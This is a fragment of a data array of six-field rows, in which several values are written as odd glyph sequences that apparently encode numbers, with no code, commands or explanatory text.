			[ⵠΔⲆ, "t", Ⲇⵠⵠⵠ, 22, 304, ᐃⵠⲆ],
			[ᐃⲆᐃ, "t", 2, 23, 304, ᐃⵠΔ],
			[ΔⲆⵠ, "t", ΔΔΔ, 24, 304, 0],
			[1, "t", 3, 25, 304, ΔⲆⲆ],
			[ⵠΔⲆ, "t", ᐃΔΔ, 27, 304, ΔΔⵠ],
			[Ⲇᐃⵠ, "t", ᐃΔΔΔ, 26, 304, ᐃΔΔ],
			[1, "b", ⵠⵠⵠΔ, 28, 304, 0],
			[1, "t", 1, 29, 304, ᐃⵠⲆ],
			[Ⲇᐃⵠ, "b", 1, 29, 303, ᐃⵠΔ],
			[ᐃᐃⵠ, "b", ⲆⲆΔᐃ, 30, 303, ⲆΔⵠ],
			[ᐃⲆᐃ, "t", 4, 31, 303, 0],
			[1, "t", 0, 32, 303, 0],
			[1, "t", 5, 33, 303, ᐃⵠΔ],
			[1, "t", 2, 34, 303, ᐃⵠⲆ],
			[ΔⲆⵠ, "t", Ⲇⵠⵠⵠ, 35, 303, ΔⲆⲆ],
			[1, "t", 1, 36, 303, ⵠⲆⲆ],
			[ⵠΔⲆ, "b", ΔⲆᐃⲆ, 37, 303, 0],
			[1, "t", ⲆⲆΔᐃ, 32, 304, ⲆΔⵠ],
			[1, "t", 4, 30, 304, ΔⲆⲆ],
			[ⵠⲆΔ, "t", ⵠⲆΔ, 31, 304, 0],
			[ᐃᐃⵠ, "b", ⵠⲆΔ, 33, 304, ⲆΔⵠ],
			[ΔΔΔ, "t", ⲆⲆΔᐃ, 35, 304, ΔΔⵠ],
			[ⵠΔΔ, "t", 5, 34, 304, ⲆΔⵠ],
			[1, "b", ⲆᐃᐃⲆ, 36, 304, ᐃⵠⲆ],
			[1, "t", 5, 37, 304, 0],
			[Ⲇᐃⵠ, "t", ΔⲆⵠ, 38, 304, 0],
			[1, "b", 1, 40, 303, ΔΔⵠ],
			[ᐃⲆᐃ, "t", 3, 39, 303, 0],
			[ⵠΔᐃ, "t", 3, 42, 304, Δⵠᐃ],
			[ⵠΔΔ, "t", ᐃⲆⵠⵠ, 38, 303, ᐃⵠΔ],
			[ΔΔΔ, "t", ⵠᐃΔⵠ, 39, 304, 0],
			[1, "t", 5, 41, 303, 0],
			[ᐃⲆᐃ, "t", ⵠᐃᐃⲆ, 41, 304, 0],
			[ⵠΔᐃ, "t", 4, 44, 303, 0],
			[1, "b", 2, 40, 304, ⵠⲆⲆ],
			[1, "b", 2, 43, 303, ᐃⵠⲆ],
			[Ⲇᐃⵠ, "t", ⵠΔΔ, 42, 303, 0],
			[Ⲇᐃⵠ, "t", 1, 43, 304, 0],
			[1, "t", 5, 44, 304, 0],
			[1, "b", 1, 45, 303, 0],
			[ⵠΔᐃ, "t", 2, 45, 304, ᐃⵠⲆ],
			[ⵠΔᐃ, "t", ⵠⵠΔⲆ, 46, 303, ΔΔⵠ],
			[1, "t", 4, 47, 303, 0],
			[Ⲇᐃⵠ, "b", 0, 48, 303, 0],
			[Ⲇᐃⵠ, "t", ΔⵠⲆⲆ, 49, 303, 0],
			[1, "t", 2, 50, 303, 0],
			[ⵠⲆΔ, "t", Ⲇᐃⵠ, 51, 303, 0],
			[ⵠΔⲆ, "t", ⲆⲆⲆΔ, 52, 303, ⵠⲆⲆ],
			[ⵠⲆΔ, "t", 5, 46, 304, ⲆΔⵠ],
			[1, "t", 2, 47, 304, 0],
			[ΔⲆⵠ, "t", 5, 48, 304, ⵠⲆⲆ],
			[1, "t", 1, 49, 304, 0],
			[1, "t", 2, 50, 304, ⲆΔⵠ],
			[ᐃᐃⵠ, "b", 1, 53, 303, ᐃⵠΔ],
			[ΔΔΔ, "b", ⲆⲆΔᐃ, 51, 304, 0],
			[ᐃᐃⵠ, "t", ⲆΔΔᐃ, 52, 304, 0],
			[ⵠΔⲆ, "t", 3, 53, 304, ⲆΔⵠ],
			[Ⲇᐃⵠ, "b", 2, 54, 303, 0],
			[1, "t", 5, 54, 304, ΔΔⵠ],
			[ⵠⲆΔ, "t", 5, 55, 303, ΔΔⵠ],
			[1, "t", ᐃᐃⲆⲆ, 56, 303, Δⵠᐃ],
			[1, "t", 4, 57, 303, 0],
			[ⵠⲆΔ, "t", ⵠᐃΔⵠ, 58, 303, ᐃΔΔ],
			[ᐃⲆᐃ, "b", ⵠΔᐃ, 55, 304, ⵠⲆⲆ],
			[ᐃⲆᐃ, "t", ⵠⵠⵠΔ, 56, 304, 0],
			[ΔΔΔ, "t", 0, 57, 304, 0],
			[1, "t", 3, 58, 304, ⵠⲆⲆ],
			[1, "t", 3, 63, 304, ᐃΔΔ],
			[1, "t", ᐃⲆᐃᐃ, 59, 303, 0],
			[1, "t", 4, 59, 304, 0],
			[1, "t", 5, 60, 303, ᐃⵠΔ],
			[ⵠⲆΔ, "t", 0, 60, 304, ⵠⲆⲆ],
			[1, "t", 0, 66, 303, 0],
			[1, "t", ᐃⵠⲆ, 70, 304, ΔΔⵠ],
			[ⵠΔⲆ, "t", 3, 61, 304, ᐃΔΔ],
			[1, "t", ⲆᐃΔᐃ, 67, 303, 0],
			[ΔⲆⵠ, "t", 3, 73, 304, 0],
			[Ⲇᐃⵠ, "t", ᐃⲆᐃᐃ, 76, 303, ΔΔⵠ],
			[ⵠⲆΔ, "t", 3, 78, 304, ⲆΔⵠ],
			[1, "t", 1, 61, 303, ⲆΔⵠ],
			[1, "t", 1, 73, 303, ⵠⲆⲆ],
			[1, "t", ᐃᐃⵠ, 79, 303, 0],
			[ΔⲆⵠ, "b", 2, 62, 304, 0],
			[1, "b", ⵠⵠⵠΔ, 70, 303, 0],
			[ⵠΔⲆ, "t", ⲆΔΔᐃ, 62, 303, 0],
			[ⵠΔΔ, "t", ΔΔᐃⲆ, 68, 303, ᐃⵠΔ],
			[ⵠΔᐃ, "t", ᐃⲆⵠⵠ, 71, 304, ᐃⵠΔ],
			[ⵠΔᐃ, "t", ΔⵠⲆⲆ, 77, 304, ⵠⲆⲆ],
			[ᐃᐃⵠ, "t", 5, 75, 303, 0],
			[ⵠΔⲆ, "t", ᐃΔΔⲆ, 64, 304, ⲆΔⵠ],
			[1, "t", ΔΔᐃⲆ, 65, 303, 0],
			[ΔΔΔ, "t", ΔΔᐃⲆ, 80, 303, Δⵠᐃ],
			[ⵠΔⲆ, "t", ΔⲆⵠ, 76, 304, ΔⲆⲆ],
			[ⵠΔⲆ, "t", 3, 63, 303, ᐃΔΔ],
			[ᐃⲆᐃ, "t", ᐃⲆⵠⵠ, 82, 304, ⲆΔⵠ],
			[ΔΔΔ, "b", ⲆᐃᐃⲆ, 65, 304, 0],
			[ΔⲆⵠ, "t", 1, 64, 303, 0],
			[ᐃⲆᐃ, "t", 1, 68, 304, ᐃΔΔ],
			[1, "t", ⲆⲆΔᐃ, 69, 304, 0],
			[ⵠΔΔ, "t", Ⲇⵠⵠⵠ, 69, 303, 0],
			[ΔⲆⵠ, "t", 5, 66, 304, 0],
			[ᐃⲆᐃ, "t", ΔΔⵠ, 67, 304, 0],
			[1, "b", 2, 72, 304, ᐃΔΔ],
			[ⵠΔΔ, "t", ΔⲆⲆ, 71, 303, 0],
			[ΔΔΔ, "t", Ⲇᐃⵠᐃ, 72, 303, 0],
			[1, "t", 4, 74, 304, ΔΔⵠ],
			[ⵠΔⲆ, "t", 2, 74, 303, 0],
			[1, "t", 3, 75, 304, 0],
			[Ⲇᐃⵠ, "t", ΔⲆⵠ, 77, 303, ΔⲆⲆ],
			[1, "t", 4, 78, 303, 0],
			[ⵠΔΔ, "t", ⲆΔⵠᐃ, 79, 304, ΔΔⵠ],
			[1, "t", ⲆᐃᐃⲆ, 80, 304, ⵠⲆⲆ],
			[1, "b", ⵠⲆΔ, 81, 304, 0],
			[ΔⲆⵠ, "t", 2, 81, 303, 0],
			[ⵠⲆΔ, "t", 5, 82, 303, ᐃΔΔ],
			[1, "t", ⵠⲆΔ, 83, 303, 0],
			[ᐃᐃⵠ, "b", 2, 83, 304, ΔΔⵠ],
			[1, "t", 1, 84, 304, ⲆΔⵠ],
			[1, "t", 4, 84, 303, 0],
			[Ⲇᐃⵠ, "t", ΔⵠⲆⲆ, 85, 304, ΔΔⵠ],
			[1, "t", 3, 85, 303, ΔΔⵠ],
			[1, "b", ⵠⵠⵠΔ, 86, 304, ΔⲆⲆ],
			[1, "t", ⵠΔΔ, 86, 303, 0],
			[ⵠΔΔ, "b", ⲆᐃΔᐃ, 87, 303, ΔⲆⲆ],
			[1, "t", Ⲇⵠⵠⵠ, 87, 304, Δⵠᐃ],
			[1, "t", 4, 88, 303, ᐃΔΔ],
			[Ⲇᐃⵠ, "t", 0, 88, 304, ᐃⵠΔ],
			[1, "b", 1, 89, 303, 0],
			[ⵠΔⲆ, "t", ΔⲆᐃⲆ, 89, 304, ᐃⵠΔ],
			[1, "t", ⵠⵠⵠᐃ, 90, 303, 0],
			[1, "t", 4, 90, 304, Δⵠᐃ],
			[1, "t", ⵠᐃΔΔ, 91, 303, Δⵠᐃ],
			[ᐃᐃⵠ, "t", 0, 91, 304, ᐃⵠⲆ],
			[1, "b", ⲆᐃᐃⲆ, 92, 303, 0],
			[ᐃⲆᐃ, "t", 4, 92, 304, ⲆΔⵠ],
			[Ⲇᐃⵠ, "t", ⵠᐃΔⵠ, 93, 303, ⵠⲆⲆ],
			[1, "t", 0, 93, 304, 0],
			[1, "b", 3, 94, 303, Δⵠᐃ],
			[ᐃᐃⵠ, "b", ΔΔⵠ, 94, 304, 0],
			[ⵠⲆΔ, "b", 0, 95, 303, 0],
			[ⵠΔⲆ, "t", ᐃⲆΔⲆ, 95, 304, ΔΔⵠ],
			[1, "f", ⵠⲆΔ, 5, 151, ΔⲆⵠ],
			[1, "f", ᐃⲆΔⲆ, ΔⵠⲆⲆ, 153, ⵠⲆΔ],
			[1, "f", 0, ᐃΔΔⲆ, 152, 1],
			[1, "f", 0, 5, 147, ⵠΔᐃ],
			[ⵠΔⲆ, "f", 0, ᐃⲆⵠⵠ, 144, 1],
			[ΔΔΔ, "f", ΔΔⵠ, ⵠⵠΔΔ, 140, 1],
			[1, "f", 1, 5, 149, ⵠΔΔ],
			[Ⲇᐃⵠ, "f", 1, ΔⵠⲆⲆ, 146, 1],
			[Ⲇᐃⵠ, "f", 1, 5, 143, ΔⲆⵠ],
			[ᐃᐃⵠ, "f", ᐃⲆᐃ, ΔΔᐃⲆ, 141, ΔΔΔ],
			[ᐃᐃⵠ, "f", ᐃⲆΔⲆ, ⵠⵠΔΔ, 150, ⵠΔⲆ],
			[ᐃⲆᐃ, "f", ⵠⵠⵠΔ, ᐃⲆⵠⵠ, 148, 1],
			[1, "f", 2, ᐃⲆⵠⵠ, 145, 1],
			[1, "f", 2, 5, 142, 1],
			[ⵠΔΔ, "f", 2, ΔΔᐃⲆ, 139, 1],
			[1, "f", ΔⵠᐃⲆ, ⲆΔΔᐃ, 136, ⵠΔⲆ],
			[1, "f", ᐃⲆⵠᐃ, ΔΔᐃⲆ, 133, 1],
			[1, "f", ⲆᐃᐃⲆ, 5, 131, ⵠΔᐃ],
			[1, "f", ⲆᐃᐃⲆ, 5, 127, ⵠΔᐃ],
			[1, "f", 2, ⲆΔΔᐃ, 125, 1],
			[Ⲇᐃⵠ, "f", ⵠΔᐃ, 5, 138, ⵠΔΔ],
			[1, "f", ⵠΔᐃ, ⵠⵠΔΔ, 135, ⵠΔᐃ],
			[ΔⲆⵠ, "f", 1, 5, 132, Ⲇᐃⵠ],
			[1, "f", ΔⲆⵠ, ⵠⵠΔΔ, 130, 1],
			[ᐃⲆᐃ, "f", Ⲇᐃⵠ, 5, 128, 1],
			[1, "f", 1, 5, 126, 1],
			[ΔΔΔ, "f", 1, 5, 124, ⵠⲆΔ],
			[1, "f", ᐃⵠΔ, 5, 129, 1],
			[1, "f", 0, ΔⵠⲆⲆ, 134, ᐃⲆᐃ],
			[ⵠΔⲆ, "f", Δⵠᐃ, 5, 137, ⵠΔⲆ],
			[1, "f", 0, ⵠⵠΔΔ, 123, ΔⲆⵠ],
			[ⵠⲆΔ, "f", ᐃᐃⵠ, ⵠⵠΔΔ, 122, ⵠΔᐃ],
			[ⵠΔᐃ, "f", Ⲇᐃⵠ, ᐃΔΔΔ, 120, ᐃⲆᐃ],
			[1, "f", ᐃᐃⵠ, ᐃΔΔΔ, 117, ᐃⲆᐃ],
			[1, "f", 1, 5, 115, 1],
			[1, "f", ΔⲆⵠ, 5, 111, 1],
			[1, "f", ΔⲆⵠ, 5, 108, 1],
			[1, "f", ⵠⵠΔⲆ, 5, 121, 1],
			[ⵠⲆΔ, "f", 2, ⲆΔΔᐃ, 118, ⵠΔΔ],
			[1, "f", ⲆⲆΔᐃ, ᐃΔΔΔ, 116, ΔΔΔ],
			[ⵠΔᐃ, "f", 2, ⵠᐃΔⵠ, 113, 1],
			[ⵠΔⲆ, "f", ᐃⲆⵠᐃ, ΔⵠⲆⲆ, 110, ⵠΔⲆ],
			[1, "f", ΔΔⵠ, ᐃΔΔⲆ, 119, Ⲇᐃⵠ],
			[ᐃᐃⵠ, "f", 0, ᐃΔΔⲆ, 114, ⵠΔᐃ],
			[ⵠⲆΔ, "f", Δⵠᐃ, 5, 112, Ⲇᐃⵠ],
			[1, "f", ⵠⲆⲆ, 5, 109, ᐃᐃⵠ],
			[ⵠⲆΔ, "f", ΔⲆⵠ, ΔⵠⲆⲆ, 106, Ⲇᐃⵠ],
			[ΔⲆⵠ, "f", 1, 5, 103, 1],
			[ᐃᐃⵠ, "f", ⵠΔΔ, ΔΔᐃⲆ, 100, 1],
			[1, "f", ΔΔΔ, 5, 97, 1],
			[ΔΔΔ, "f", Ⲇᐃⵠ, ⲆΔΔᐃ, 95, ΔΔΔ],
			[1, "f", 2, 5, 107, ⵠⲆΔ],
			[ⵠΔΔ, "f", 2, 5, 105, ⵠⲆΔ],
			[1, "f", 2, ᐃΔΔΔ, 102, ᐃᐃⵠ],
			[ⵠⲆΔ, "f", ⵠⵠⵠΔ, 5, 99, ⵠⲆΔ],
			[ⵠΔⲆ, "f", 2, 5, 96, 1],
			[ⵠⲆΔ, "f", ᐃⲆΔⲆ, 5, 94, 1],
			[1, "f", 0, 5, 104, 1],
			[ᐃⲆᐃ, "f", ᐃΔΔ, 5, 101, 1],
			[ⵠΔⲆ, "f", ΔΔⵠ, ⵠⵠΔΔ, 98, 1],
			[ΔΔΔ, "f", 0, 5, 93, 1],
			[ⵠΔᐃ, "f", ΔⲆⵠ, 5, 92, ⵠΔΔ],
			[1, "f", 1, ⵠᐃΔⵠ, 89, ⵠΔᐃ],
			[ⵠΔᐃ, "f", 1, 5, 86, ⵠⲆΔ],
			[ⵠⲆΔ, "f", ᐃᐃⵠ, ⲆΔΔᐃ, 83, ᐃⲆᐃ],
			[ΔⲆⵠ, "f", 1, 5, 80, 1],
			[1, "f", 1, 5, 78, 1],
			[1, "f", ᐃⲆⵠᐃ, 5, 90, 1],
			[1, "f", ᐃⲆⵠᐃ, 5, 88, ⵠΔᐃ],
			[1, "f", ⲆⲆΔᐃ, ᐃΔΔⲆ, 85, 1],
			[Ⲇᐃⵠ, "f", ᐃⲆⵠᐃ, 5, 82, 1],
			[1, "f", 2, ⵠⵠΔΔ, 79, ⵠΔΔ],
			[1, "f", 2, 5, 77, ⵠⲆΔ],
			[1, "f", ⵠⵠΔⲆ, 5, 75, 1],
			[ΔΔΔ, "f", 2, 5, 72, ⵠΔΔ],
			[ⵠΔΔ, "f", 0, 5, 91, 1],
			[1, "f", 0, 5, 87, ⵠΔᐃ],
			[1, "f", 0, 5, 84, 1],
			[1, "f", ᐃⵠΔ, ⵠᐃΔⵠ, 81, ⵠΔΔ],
			[1, "f", ⵠⲆⲆ, 5, 76, 1],
			[Ⲇᐃⵠ, "f", 0, ΔⵠⲆⲆ, 74, ⵠΔᐃ],
			[1, "f", ᐃⲆᐃ, ΔΔᐃⲆ, 73, ᐃⲆᐃ],
			[1, "f", ⵠΔΔ, 5, 71, ᐃᐃⵠ],
			[1, "f", 1, ⵠᐃΔⵠ, 68, ᐃᐃⵠ],
			[ⵠⲆΔ, "f", ⵠⲆΔ, ΔⵠⲆⲆ, 66, ⵠⲆΔ],
			[1, "f", 1, 5, 62, ΔΔΔ],
			[ⵠΔᐃ, "f", ⵠⲆΔ, ⵠⵠΔΔ, 59, 1],
			[Ⲇᐃⵠ, "f", ⵠΔᐃ, 5, 56, ⵠΔⲆ],
			[ⵠΔΔ, "f", ⵠΔᐃ, ⲆΔΔᐃ, 53, 1],
			[Ⲇᐃⵠ, "f", 1, 5, 50, 1],
			[1, "f", 2, 5, 70, 1],
			[Ⲇᐃⵠ, "f", ⵠⵠΔⲆ, ᐃΔΔⲆ, 67, ΔⲆⵠ],
			[ⵠΔΔ, "f", 2, 5, 65, ΔⲆⵠ],
			[1, "f", ⵠⵠΔⲆ, 5, 63, 1],
			[Ⲇᐃⵠ, "f", 2, ⲆΔΔᐃ, 60, 1],
			[Ⲇᐃⵠ, "f", 2, 5, 57, ᐃⲆᐃ],
			[1, "f", 2, 5, 54, 1],
			[ⵠΔⲆ, "f", 2, 5, 51, 1],
			[1, "f", 0, 5, 69, ⵠΔᐃ],
			[Ⲇᐃⵠ, "f", 0, ⵠⵠΔΔ, 64, 1],
			[1, "f", Δⵠᐃ, ᐃΔΔⲆ, 61, ⵠⲆΔ],
			[ⵠΔΔ, "f", ΔΔⵠ, 5, 58, ΔⲆⵠ],
			[ΔΔΔ, "f", 0, 5, 55, ΔΔΔ],
			[ⵠΔⲆ, "f", ΔⲆⲆ, ᐃΔΔⲆ, 52, 1],
			[1, "f", 0, 5, 49, 1],
			[ⵠΔΔ, "f", 0, ᐃΔΔⲆ, 45, Ⲇᐃⵠ],
			[ᐃⲆᐃ, "f", ΔⲆⲆ, ⵠᐃΔⵠ, 42, 1],
			[1, "f", Δⵠᐃ, 5, 38, ⵠΔΔ],
			[1, "f", ΔⲆⲆ, 5, 34, ⵠΔᐃ],
			[1, "f", Δⵠᐃ, ⵠⵠΔΔ, 31, ᐃᐃⵠ],
			[1, "f", 1, ⵠᐃΔⵠ, 48, 1],
			[1, "f", ⵠΔΔ, ⵠᐃΔⵠ, 44, ⵠⲆΔ],
			[1, "f", ⵠⲆΔ, ⵠᐃΔⵠ, 41, 1],
			[1, "f", 1, 5, 37, ᐃⲆᐃ],
			[1, "f", 1, 5, 33, 1],
			[ΔⲆⵠ, "f", Ⲇᐃⵠ, ΔⵠⲆⲆ, 29, ΔⲆⵠ],
			[Ⲇᐃⵠ, "f", 2, 5, 30, ΔΔΔ],
			[Ⲇᐃⵠ, "f", ⵠⵠⵠΔ, 5, 32, ΔΔΔ],
			[ᐃⲆᐃ, "f", 2, 5, 35, ᐃᐃⵠ],
			[1, "f", ⵠⵠⵠΔ, ᐃⲆⵠⵠ, 39, 1],
			[ᐃᐃⵠ, "f", 2, 5, 46, 1],
			[ΔΔΔ, "f", 2, 5, 43, Ⲇᐃⵠ],
			[ᐃⲆᐃ, "f", ⵠΔᐃ, ΔΔᐃⲆ, 47, ⵠΔΔ],
			[ᐃⲆᐃ, "f", 0, ᐃΔΔΔ, 40, 1],
			[1, "f", 0, 5, 36, ⵠΔΔ],
			[ⵠΔΔ, "f", ⵠⲆⲆ, ⵠᐃΔⵠ, 28, 1],
			[1, "f", 1, 5, 25, 1],
			[1, "f", ΔΔΔ, 5, 22, 1],
			[1, "f", 1, 5, ΔᐃⲆⵠᐃ, ᐃⲆᐃ],
			[1, "f", 1, ᐃΔΔⲆ, ΔⵠΔᐃᐃ, 1],
			[ⵠΔᐃ, "f", ⵠⲆΔ, 5, 13, 1],
			[1, "f", 1, ⵠᐃΔⵠ, ⲆⵠΔΔᐃ, 1],
			[1, "f", ᐃⲆⵠᐃ, ᐃⲆⵠⵠ, 27, 1],
			[ᐃⲆᐃ, "f", ⵠⵠΔⲆ, 5, 24, 1],
			[1, "f", 2, 5, 21, ⵠΔᐃ],
			[1, "f", 2, ᐃⲆⵠⵠ, ΔⲆⲆⲆⵠ, ΔΔΔ],
			[ⵠⲆΔ, "f", ΔⵠᐃⲆ, 5, ΔⲆΔⲆⲆ, ⵠⲆΔ],
			[1, "f", 2, 5, ᐃⲆⲆΔⵠ, Ⲇᐃⵠ],
			[ⵠΔⲆ, "f", 2, ⵠᐃΔⵠ, ⲆΔⵠᐃΔ, Ⲇᐃⵠ],
			[1, "f", Δⵠᐃ, ᐃΔΔⲆ, 26, Ⲇᐃⵠ],
			[1, "f", 0, 5, 23, ⵠΔΔ],
			[1, "f", Δⵠᐃ, ⲆΔΔᐃ, ⲆΔⲆⵠᐃ, ⵠⲆΔ],
			[ⵠΔⲆ, "f", 0, ΔΔᐃⲆ, ΔⵠᐃΔⵠ, ⵠΔⲆ],
			[Ⲇᐃⵠ, "f", 0, 5, ⲆⵠᐃΔᐃ, 1],
			[1, "f", ᐃᐃⵠ, ΔⵠⲆⲆ, 18, 1],
			[1, "f", ᐃⲆᐃ, ᐃΔΔΔ, ΔᐃᐃⲆᐃ, ΔΔΔ],
			[1, "f", ᐃⵠΔ, 5, ΔⲆΔᐃᐃ, ⵠΔΔ],
			[ⵠΔⲆ, "f", 1, 5, ⵠΔᐃΔⲆ, 1],
			[ᐃᐃⵠ, "f", ᐃⵠΔ, ᐃΔΔΔ, 5, 1],
			[1, "f", Ⲇᐃⵠ, ΔᐃⲆᐃ, ᐃΔΔⲆ, ⵠⲆΔ],
			[1, "f", ⲆⲆΔᐃ, ᐃΔⲆΔᐃ, ⵠᐃΔⵠ, Ⲇᐃⵠ],
			[ᐃⲆᐃ, "f", ⵠⲆⲆ, ΔᐃΔⲆⲆ, 5, ⵠⲆΔ],
			[1, "f", 1, 9, 5, Ⲇᐃⵠ],
			[1, "f", Ⲇᐃⵠ, 12, ᐃΔΔΔ, 1],
			[ᐃⲆᐃ, "f", 1, ΔⲆΔⲆⲆ, 5, ᐃⲆᐃ],
			[ΔΔΔ, "f", 1, 17, 5, ᐃⲆᐃ],
			[ⵠⲆΔ, "f", Ⲇᐃⵠ, 22, ᐃⲆⵠⵠ, 1],
			[1, "f", Ⲇᐃⵠ, 26, 5, 1],
			[ⵠΔⲆ, "f", ⵠⵠΔⲆ, 10, ΔⵠⲆⲆ, ⵠΔΔ],
			[ⵠΔᐃ, "f", ΔⵠᐃⲆ, ᐃⲆⵠᐃⲆ, 5, ΔΔΔ],
			[1, "f", 2, ⵠΔⵠΔΔ, ΔΔᐃⲆ, 1],
			[ΔΔΔ, "f", 2, 18, ⵠᐃΔⵠ, ⵠΔⲆ],
			[ⵠΔⲆ, "f", ⵠⵠΔⲆ, 21, ᐃⲆⵠⵠ, 1],
			[1, "f", 2, 23, 5, 1],
			[ΔⲆⵠ, "f", ⲆᐃᐃⲆ, 25, ᐃΔΔⲆ, ⵠⲆΔ],
			[1, "f", ⵠⵠΔⲆ, 27, 5, ⵠΔΔ],
			[ⵠΔⲆ, "f", ᐃⵠⲆ, ⲆΔᐃⵠᐃ, 5, ΔⲆⵠ],
			[ΔⲆⵠ, "f", 0, ΔⲆᐃᐃᐃ, ⵠᐃΔⵠ, 1],
			[ΔΔΔ, "f", 0, ⲆⲆⲆⵠᐃ, ⵠⵠΔΔ, 1],
			[1, "f", ᐃⵠΔ, 24, ΔⵠⲆⲆ, 1],
			[1, "f", ᐃⵠⲆ, 28, 5, 1],
			[1, "f", ⵠΔⲆ, ⵠⵠⵠⲆᐃ, ᐃΔΔΔ, ΔΔΔ],
			[ΔⲆⵠ, "f", ⵠΔⲆ, 29, ᐃΔΔΔ, ⵠΔΔ],
			[1, "f", Ⲇᐃⵠ, 32, ᐃΔΔⲆ, ⵠΔᐃ],
			[ⵠⲆΔ, "f", 1, 35, 5, 1],
			[ⵠΔΔ, "f", ⵠⲆΔ, 38, ⵠⵠΔΔ, ᐃᐃⵠ],
			[1, "f", 1, 41, 5, ⵠΔⲆ],
			[ΔΔΔ, "f", 1, 45, 5, ΔΔΔ],
			[ᐃᐃⵠ, "f", 2, 30, 5, ⵠΔⲆ],
			[1, "f", 2, 33, ᐃΔΔⲆ, 1],
			[1, "f", 2, 36, 5, 1],
			[ΔΔΔ, "f", 2, 39, 5, ᐃⲆᐃ],
			[1, "f", ⵠⵠⵠΔ, 42, ⵠⵠΔΔ, ⵠⲆΔ],
			[1, "f", ⵠⵠΔⲆ, 44, 5, ⵠΔⲆ],
			[Ⲇᐃⵠ, "f", ⵠⵠΔⲆ, 46, 5, 1],
			[ᐃᐃⵠ, "f", 0, 43, ⵠⵠΔΔ, 1],
			[ⵠΔᐃ, "f", ᐃⵠΔ, 40, ᐃΔΔΔ, ⵠⲆΔ],
			[Ⲇᐃⵠ, "f", ⵠⲆⲆ, 37, ⲆΔΔᐃ, 1],
			[ΔⲆⵠ, "f", 0, 34, ⵠⵠΔΔ, ᐃᐃⵠ],
			[ΔΔΔ, "f", ᐃΔΔ, 31, 5, 1],
			[Ⲇᐃⵠ, "f", ⲆΔⵠ, 47, 5, ⵠΔᐃ],
			[ⵠΔⲆ, "f", 1, 48, ᐃⲆⵠⵠ, ⵠΔⲆ],
			[1, "f", ⵠⲆΔ, 51, 5, ⵠⲆΔ],
			[1, "f", ⵠΔΔ, 53, 5, 1],
			[1, "f", 1, 57, 5, ⵠΔⲆ],
			[ⵠΔᐃ, "f", ⵠⲆΔ, 60, ᐃⲆⵠⵠ, 1],
			[1, "f", 1, 63, ΔΔᐃⲆ, ᐃⲆᐃ],
			[1, "f", Ⲇᐃⵠ, 65, 5, ⵠΔΔ],
			[ΔΔΔ, "f", 2, 64, 5, 1],
			[ⵠΔΔ, "f", ⵠⵠⵠΔ, 62, ΔⵠⲆⲆ, ⵠΔᐃ],
			[1, "f", 2, 59, 5, 1],
			[ⵠΔᐃ, "f", 2, 56, 5, ΔΔΔ],
			[ΔⲆⵠ, "f", ᐃⲆⵠᐃ, 52, ᐃⲆⵠⵠ, 1],
			[1, "f", 2, 49, 5, ⵠΔⲆ],
			[1, "f", ⲆᐃᐃⲆ, 54, 5, ᐃᐃⵠ],
			[ΔΔΔ, "f", 0, 50, 5, 1],
			[1, "f", 0, 55, 5, ⵠⲆΔ],
			[1, "f", 0, 58, 5, ᐃⲆᐃ],
			[ᐃⲆᐃ, "f", 0, 61, 5, 1],
			[1, "f", ⲆΔⵠ, 66, ᐃΔΔΔ, 1],
			[1, "f", ⵠΔᐃ, 67, ᐃΔΔⲆ, ⵠⲆΔ],
			[1, "f", 1, 70, ⵠⵠΔΔ, ᐃᐃⵠ],
			[ΔΔΔ, "f", 1, 72, ⵠⵠΔΔ, Ⲇᐃⵠ],
			[1, "f", ⵠⲆΔ, 75, ⲆΔΔᐃ, 1],
			[1, "f", 1, 79, ΔΔᐃⲆ, 1],
			[ᐃⲆᐃ, "f", 2, 68, 5, ⵠⲆΔ],
			[ᐃᐃⵠ, "f", ΔⵠᐃⲆ, 71, 5, ⵠⲆΔ],
			[ⵠΔΔ, "f", ⵠⵠⵠΔ, 74, 5, ΔΔΔ],
			[ⵠΔᐃ, "f", 2, 76, ᐃΔΔΔ, ⵠΔⲆ],
			[1, "f", ⲆⲆΔᐃ, 78, ᐃΔΔⲆ, ΔⲆⵠ],
			[ΔΔΔ, "f", ᐃΔΔ, 69, ΔⵠⲆⲆ, ᐃᐃⵠ],
			[Ⲇᐃⵠ, "f", 0, 73, 5, 1],
			[ᐃⲆᐃ, "f", 0, 77, ΔΔᐃⲆ, 1],
			[Ⲇᐃⵠ, "f", ΔΔⵠ, 80, 5, 1],
			[Ⲇᐃⵠ, "f", ⵠΔⲆ, 81, ⲆΔΔᐃ, ⵠⲆΔ],
			[ⵠΔᐃ, "f", ΔΔΔ, 84, 5, 1],
			[ΔⲆⵠ, "f", ᐃⲆᐃ, 87, ᐃΔΔⲆ, 1],
			[ⵠⲆΔ, "f", 1, 89, ΔⵠⲆⲆ, ⵠΔⲆ],
			[ᐃᐃⵠ, "f", ⵠΔⲆ, 92, ⵠᐃΔⵠ, ᐃᐃⵠ],
			[ᐃⲆᐃ, "f", ΔⲆⵠ, 94, ⵠⵠΔΔ, 1],
			[Ⲇᐃⵠ, "f", Δⵠᐃ, 82, ΔⵠⲆⲆ, ᐃᐃⵠ],
			[1, "f", ᐃⲆΔⲆ, 83, 5, 1],
			[1, "f", 2, 85, ΔⵠⲆⲆ, ⵠΔᐃ],
			[ΔⲆⵠ, "f", ΔⵠᐃⲆ, 88, 5, 1],
			[ⵠΔΔ, "f", 2, 90, ΔⵠⲆⲆ, ᐃⲆᐃ],
			[Ⲇᐃⵠ, "f", 2, 93, ᐃΔΔΔ, 1],
			[ᐃⲆᐃ, "f", ΔⵠᐃⲆ, 95, 5, ⵠⲆΔ],
			[ᐃⲆᐃ, "f", Δⵠᐃ, 86, 5, ⵠΔΔ],
			[1, "f", 0, 91, ᐃΔΔⲆ, ᐃᐃⵠ],
			[1, "f", ⵠⵠⵠΔ, 6, 153, 1],
			[ⵠΔⲆ, "f", ⵠΔⲆ, ⵠᐃΔⵠⲆ, 152, 1],
			[ⵠⲆΔ, "t", 1, 93, 301, 0],
			[1, "t", 3, 94, 302, ᐃⵠΔ],
			[ⵠΔᐃ, "t", 5, 95, 302, ᐃⵠⲆ],
			[ⵠΔⲆ, "t", ᐃΔΔΔ, 93, 302, 0],
			[1, "b", 3, 92, 302, 0],
			[ⵠⲆΔ, "t", 1, 91, 302, ΔⲆⲆ],
			[1, "t", 5, 90, 302, 0],
			[1, "b", ᐃⲆⵠᐃ, 92, 301, ᐃⵠΔ],
			[1, "t", 1, 91, 301, 0],
			[ⵠⲆΔ, "t", ⵠⵠⵠΔ, 90, 301, 0],
			[ΔΔΔ, "b", 2, 89, 302, 0],
